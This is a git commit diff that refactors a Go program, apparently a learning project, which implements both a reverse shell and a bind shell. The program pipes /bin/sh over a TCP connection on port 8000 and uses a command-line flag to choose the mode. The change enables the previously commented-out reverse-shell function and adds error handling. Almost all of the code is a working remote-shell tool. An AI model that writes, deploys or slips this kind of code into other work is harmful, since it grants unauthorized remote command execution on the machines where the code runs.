37ca7de8dbf53ae07b5227afff6d87a9711c0e8b
dreddsa5dies <viktor.vladimirovich.solovev@gmail.com>
2022-08-04 08:46:59 +0300

    refactoring

--- projects/16_shell/shell.go
+++ projects/16_shell/shell.go
@@ -1,31 +1,48 @@
 package main
 
 import (
+	"flag"
 	"log"
 	"net"
 	"os/exec"
 )
 
-/*
 func reverseShell(network, address, shell string) {
-	c, _ := net.Dial(network, address)
+	c, err := net.Dial(network, address)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
 	cmd := exec.Command(shell)
+
 	cmd.Stdin = c
 	cmd.Stdout = c
 	cmd.Stderr = c
-	cmd.Run()
+
+	err = cmd.Run()
+	if err != nil {
+		log.Println(err)
+		return
+	}
 }
-*/
 
 func bindShell(network, address, shell string) {
 	l, err := net.Listen(network, address)
 	if err != nil {
-		log.Fatalln(err)
+		log.Println(err)
+		return
 	}
 	defer l.Close()
+
 	for {
 		// Wait for a connection.
-		conn, _ := l.Accept()
+		conn, err := l.Accept()
+		if err != nil {
+			log.Println(err)
+			return
+		}
+
 		// Handle the connection in a new goroutine.
 		// The loop then returns to accepting, so that
 		// multiple connections may be served concurrently.
@@ -34,13 +51,32 @@ func bindShell(network, address, shell string) {
 			cmd.Stdin = c
 			cmd.Stdout = c
 			cmd.Stderr = c
-			cmd.Run()
+
+			err := cmd.Run()
+			if err != nil {
+				log.Println(err)
+				return
+			}
 			defer c.Close()
 		}(conn)
 	}
 }
 
+var (
+	r bool
+)
+
+func init() {
+	flag.BoolVar(&r, "flag", false, "Reverse or bind shell?")
+}
+
 func main() {
-	//reverseShell("tcp", ":8000", "/bin/sh")
+	// разбор флагов
+	flag.Parse()
+
+	if r {
+		reverseShell("tcp", ":8000", "/bin/sh")
+	}
+
 	bindShell("tcp", ":8000", "/bin/sh")
 }
